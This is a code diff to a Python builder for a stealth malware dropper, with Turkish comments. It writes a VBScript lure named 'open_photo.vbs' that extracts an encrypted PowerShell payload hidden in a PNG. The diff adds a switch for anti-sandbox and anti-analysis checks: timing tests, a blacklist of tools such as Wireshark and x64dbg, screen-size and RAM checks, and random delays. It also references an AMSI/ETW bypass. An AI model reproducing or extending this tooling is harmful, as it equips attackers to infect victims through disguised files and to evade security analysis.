@@ -134,9 +134,11 @@ def build_amsi_bypass():
     )
     return amsi + etw
 
-def build_vbs_dropper(png_filename, key_b64):
+def build_vbs_dropper(png_filename, key_b64, anti_sandbox=True):
     vbs = f'''On Error Resume Next
-Dim t1, t2
+'''
+    if anti_sandbox:
+        vbs += '''Dim t1, t2
 t1 = Timer
 WScript.Sleep 1500
 t2 = Timer
@@ -151,7 +153,8 @@ For Each item In items
         WScript.Quit
     End If
 Next
-
+'''
+    vbs += f'''
 Set sh = CreateObject("WScript.Shell")
 Dim myDir
 myDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\\"))
@@ -215,8 +218,11 @@ If pPos > 0 Then
     Loop
     payB64 = Mid(txt, pStart, pEnd2 - pStart)
 End If
-
+'''
+    if anti_sandbox:
+        vbs += '''
 ' ── Analiz aracı tespiti (Wireshark, ProcMon, x64dbg vb.) ──
+Set wmi = GetObject("winmgmts:")
 Dim proc, procs
 Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
 Dim blacklist
@@ -232,7 +238,7 @@ Next
 
 ' ── Ekran çözünürlük ve RAM kontrolü (Sandbox genelde küçük kullanır) ──
 Dim scrW, scrH
-scrW = sh.RegRead("HKCU\Control Panel\Desktop\ScreenWidth")
+scrW = sh.RegRead("HKCU\\Control Panel\\Desktop\\ScreenWidth")
 If CInt(scrW) < 1024 Then WScript.Quit
 
 Dim mem
@@ -244,7 +250,9 @@ If mem < 2 Then WScript.Quit
 ' ── Rastgele gecikme (3-8 saniye) — davranışsal analizi zorlaştırır ──
 Randomize
 WScript.Sleep Int((8000 - 3000 + 1) * Rnd + 3000)
+'''
 
+    vbs += '''
 If Len(keyB64) = 0 Or Len(payB64) = 0 Then WScript.Quit
 
 Dim xml1
@@ -346,11 +354,14 @@ def c2_payload_builder():
             png_name = "photo.png"
             out_png = os.path.join(output_dir, png_name)
 
+            anti_sb_input = input(f"\n{C.CYAN}  [?] Gelişmiş Gizlilik (Anti-VM/Sandbox) açılsın mı? (Kendi bilgisayarınızda test ediyorsanız 'H' girin) [E/h]: {C.RESET}").strip().lower()
+            anti_sb = False if anti_sb_input == 'h' else True
+
             key_b64, err = embed_in_png(img_path, full_ps, out_png)
             if err:
                 print(f"{C.RED}  [-] Hata: {err}{C.RESET}")
             else:
-                vbs_content = build_vbs_dropper(png_name, key_b64)
+                vbs_content = build_vbs_dropper(png_name, key_b64, anti_sandbox=anti_sb)
                 vbs_path = os.path.join(output_dir, "open_photo.vbs")
                 save_text(vbs_path, vbs_content)
                 print(f"\n{C.GREEN}{C.BOLD}  [+] STEALTH DROPPER PAKETİ HAZIR: {output_dir}/{C.RESET}")
